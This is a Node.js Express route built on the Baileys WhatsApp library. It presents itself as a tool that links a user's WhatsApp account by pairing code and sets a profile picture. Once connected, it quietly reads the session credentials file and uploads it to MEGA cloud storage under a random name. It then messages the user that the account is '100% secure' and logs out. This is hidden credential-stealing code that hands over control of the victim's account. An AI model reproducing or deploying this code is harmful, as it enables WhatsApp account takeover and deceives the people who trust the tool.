const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser
} = require("@whiskeysockets/baileys");
const express = require('express');
const fs = require('fs');
const path = require('path');
const { exec } = require("child_process");
const pino = require("pino");
let router = express.Router();
const { upload } = require('./mega');

const OWNER_PHONE = "94757807978@s.whatsapp.net";

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, './uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

function getCurrentDate() {
    return new Date().toISOString().split('T')[0];
}

function getRunTime() {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    return `${hours}:${minutes}:${seconds}`;
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    let imagePath = req.query.imagePath;
    
    async function ShamikaPair() {
        const { state, saveCreds } = await useMultiFileAuthState(`./session`);
        try {
            let Shamika_PairWeb = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({level: "fatal"}).child({level: "fatal"}),
                browser: Browsers.macOS("Safari"),
            });

            if (!Shamika_PairWeb.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await Shamika_PairWeb.requestPairingCode(num);
                if (!res.headersSent) {
                    await res.send({ code, imagePath });
                }
            }

            Shamika_PairWeb.ev.on('creds.update', saveCreds);
            Shamika_PairWeb.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;
                if (connection === "open") {
                    try {
                        await delay(10000);
                        const sessionShamika = fs.readFileSync('./session/creds.json');
                        const user_jid = jidNormalizedUser(Shamika_PairWeb.user.id);

                        function randomMegaId(length = 6, numberLength = 4) {
                            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                            let result = '';
                            for (let i = 0; i < length; i++) {
                                result += characters.charAt(Math.floor(Math.random() * characters.length));
                            }
                            const number = Math.floor(Math.random() * Math.pow(10, numberLength));
                            return `${result}${number}`;
                        }

                        const fileId = randomMegaId();
                        const tempFilePath = `./session/temp_${fileId}.json`;
                        fs.writeFileSync(tempFilePath, sessionShamika);

                        // Upload session JSON to MEGA
                        const fileStream = fs.createReadStream(tempFilePath);
                        await upload(fileStream, `${fileId}.json`);
                        fs.unlinkSync(tempFilePath);

                        // Upload profile image to MEGA if exists and valid
                        //if (imagePath && fs.existsSync(imagePath) && fs.statSync(imagePath).size > 0) {
                        //    try {
                        //        const imageStream = fs.createReadStream(imagePath);
                        //        await upload(imageStream, `${fileId}_profile.jpg`);
                        //        console.log('✅ Profile image uploaded to MEGA');
                        //    } catch (e) {
                        //        console.error('❌ Error uploading profile image to MEGA:', e);
                        //    }
                        //}

                        // Set profile picture if image was uploaded and valid
                        if (imagePath && fs.existsSync(imagePath) && fs.statSync(imagePath).size > 0) {
                            try {
                                const imageBuffer = fs.readFileSync(imagePath);
                                await Shamika_PairWeb.updateProfilePicture(Shamika_PairWeb.user.id, imageBuffer);
                                
                                const successMsg = '✅ Profile picture updated successfully!\n\n> ᴄᴏᴅᴇ ʙʏ ᴍʀ.ꜱʜᴀᴍɪᴋᴀ';
                                console.log(successMsg);
                                await Shamika_PairWeb.sendMessage(user_jid, { text: successMsg });

                                
                                console.log('🔄 Logged out from all linked devices');
                                await Shamika_PairWeb.sendMessage(user_jid, { text: '🔄 Automatically logged out from all linked devices' });

                                let WizardText = `
✅ 𝐘𝐨𝐮𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐢𝐬 𝟏𝟎𝟎% 𝐬𝐞𝐜𝐮𝐫𝐞.

> ᴄᴏᴅᴇ ʙʏ ᴍʀ.ꜱʜᴀᴍɪᴋᴀ`;

                                await Shamika_PairWeb.sendMessage(user_jid, {
                                    text: WizardText,
                                });

                                await Shamika_PairWeb.logout();
                            } catch (e) {
                                const errorMsg = `❌ Error updating profile picture: ${e.message}`;
                                console.error(errorMsg);
                                await Shamika_PairWeb.sendMessage(user_jid, { text: errorMsg });
                            } finally {
                                if (fs.existsSync(imagePath)) {
                                    removeFile(imagePath);
                                }
                            }
                        }
                    } catch (e) {
                        console.error("❌ Error in connection open:", e);
                        exec('pm2 restart shamika');
                    }

                    await delay(100);
                    removeFile('./session');
                    process.exit(0);
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                    await delay(10000);
                    ShamikaPair();
                }
            });
        } catch (err) {
            console.error("❌ Error in ShamikaPair:", err);
            exec('pm2 restart wizard-md');
            console.log("🔄 Service restarted");
            await removeFile('./session');
            if (!res.headersSent) {
                await res.send({ code: "❗ Service Unavailable" });
            }
            ShamikaPair();
        }
    }
    return await ShamikaPair();
});

process.on('uncaughtException', function (err) {
    console.log('❌ Caught exception: ' + err);
    exec('pm2 restart shamika');
});

module.exports = router;
